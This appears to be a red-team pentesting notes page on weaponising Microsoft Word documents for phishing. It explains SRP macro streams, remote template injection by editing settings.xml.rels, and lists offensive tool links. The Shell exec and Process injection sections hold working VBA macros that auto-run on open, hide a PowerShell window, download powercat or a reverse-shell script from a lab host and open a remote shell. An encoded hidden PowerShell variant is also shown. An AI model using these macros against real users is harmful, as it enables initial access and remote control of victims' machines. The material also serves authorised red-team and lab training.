| 🏠 [Home](../../pentesting.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

* [Word](../../red_team/phishing/word.md)
    * [Remote Template Injection](../../red_team/phishing/word.md#remote-template-injection)
    * [Thread injection](../../red_team/phishing/word.md#thread-injection)
    * [Process injection](../../red_team/phishing/word.md#process-injection)
    * [Shell exec](../../red_team/phishing/word.md#shell-exec)
    * [Tools](../../red_team/phishing/word.md#tools)
    * [Links](../../red_team/phishing/word.md#links)
# Word

## SRP (Software Restriction Policy)

Inside OLE structured storage (used by .doc, .xls, etc.), VBA projects live under:

Root\Macros\VBA\ (Word)

Root\_VBA_PROJECT_CUR\VBA\ (Excel)

Besides the well-known streams (dir, module names, _VBA_PROJECT), Office sometimes creates hidden internal streams named:
```
__SRP_0
__SRP_1
__SRP_2
__SRP_3
```
These streams are used by Office’s macro security enforcement, especially when:

* Macros are blocked by policy
* The document is opened from untrusted locations
* Zone identifiers / Mark-of-the-Web are involved
* AMSI / VBA policy enforcement triggers

They store policy evaluation metadata, not executable logic.

If these streams exist and the VBA project changes underneath them, Office may:
 
* Refuse to load macros
* Mark the project as corrupted
* Keep macros disabled even if policy allows them

So purging them is a consistency / hygiene step, not a magic bypass.

Deleting these streams:

* Removes Office’s cached security decision
* Forces Office to re-evaluate the VBA project on next open
* Cleans up artifacts left by previous policy evaluation
* Often used after modifying VBA streams to avoid corruption or load errors


* [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)

## Remote Template Injection

a normal.doc with a remote dotm template which will run macro when open...it download the template and run the script inside


### `.docm` file


* Go to `File > Options`.
* Select `Customize Ribbon`.
* Check the box for `Developer` under Main Tabs and click OK.
* open VBA editor and create the payload
* save as `Word Macro-Enabled Template Document (*.dotm)`
* Close the document and reopen it.
* If Word displays a Security Warning about macros, click Enable Content to allow the macro to run and save the file

### `.docx` file


* Create a .docx file based on a template
* Change the `settings.xml.rels` file to point to the `.docm` URL.
    * `mv <name>.docx <name>.zip` 
    * `expand-archive ./<name>.zip`
    * Depending on the Microsoft Word version, the `settings.xml.rels` file can be found in `<name>/word/_rels/settings.xml.rels`.
    * Modify the `Target` attribute to point to the URL where the template file is hosted.
    * `...ps/attachedTemplate" Target="http://10.10.14.17/lab/lib/jubeaz.dotm" TargetMode="External"...`
    * Save your changes and repackage the files using `Compress-Archive`
    * Rename the `.zip` file back to `.docx`
* Repackage the files into a .docx format.

## Thread injection 

## Process injection
* [solid-macro](https://github.com/noderaven/solid-macro): very sofisticated 
* [macro_reverse_shell](https://github.com/glowbase/macro_reverse_shell)

edit line:
```vb
cmdStr = "powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('<pwsh_reverse_shell_path>'))  #"
```



## Shell exec

```vb
Sub AutoOpen()
	Jubeaz
End Sub

' Sub Document_Open()
' 	Jubeaz
' End Sub

Sub Jubeaz()
	Dim url as String
    Dim psScript as String 

    url = "http://10.10.14.17/lab/lib/powercat.ps1"
    psScript="IEX(New-Object System.Net.WebClient).DownloadString('" & url & "'); powercat -c 10.10.14.17 -p 443 -e cmd"
    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -c """ & psScript & """", vbHide
End Sub
```

or
```vb
Dim Str As String
 
Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
...SNIP...
CreateObject("Wscript.Shell").Run Str
```


## tools
* [RTI-Toolkit](https://github.com/nickvourd/RTI-Toolkit)
* [spoofing-office-macro ](https://github.com/christophetd/spoofing-office-macro/tree/master)
* [macro_reverse_shell](https://github.com/glowbase/macro_reverse_shell)
* [solid-macro](https://github.com/noderaven/solid-macro)

## Links
* [Phishing with MS Office](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office)
* [How To Make A Reverse Shell With Microsoft Word Macros](https://medium.com/@calvintconnor/how-to-make-a-reverse-shell-with-microsoft-word-macros-94797534ffb3)
* [Living off the Land : The Mechanics of Remote Template Injection Attack](https://www.cyfirma.com/research/living-off-the-land-the-mechanics-of-remote-template-injection-attack/)
* [Building an Office macro to spoof parent processes and command line arguments](https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/)
* [Red Teaming in the EDR age](https://www.youtube.com/watch?v=l8nkXCOYQC4)